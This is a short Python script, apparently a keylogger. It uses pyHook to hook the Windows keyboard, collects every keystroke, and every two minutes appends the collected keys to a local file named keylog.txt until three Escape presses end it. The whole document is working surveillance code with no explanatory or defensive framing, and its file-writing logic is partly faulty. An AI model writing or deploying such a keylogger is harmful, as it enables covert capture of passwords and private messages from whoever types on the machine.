import pythoncom
import pyHook
import time
import sys
import os

string = ""
t0 = time.time()

maxTime = None # if max = None, unlimited
saveInterval = 1

def keypressed(event):
    global string
    
    string += str(event.GetKey())

    return True 

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()

with open("keylog.txt","r+" if os.path.exists("keylog.txt") else "w+") as f:
    while True:
        pythoncom.PumpWaitingMessages()
        t1 = time.time()

        if "Escape"*3 in string or (maxTime is not None and int((t1-t0)/60) >= maxTime):
            break

        if not int((t1-t0)/60) % 2 and int((t1-t0)/60):
            f.write(f.read()+string)
            string = ""
        
    f.write(f.read()+string.strip("Escape"*3))
    f.close()
    sys.exit()
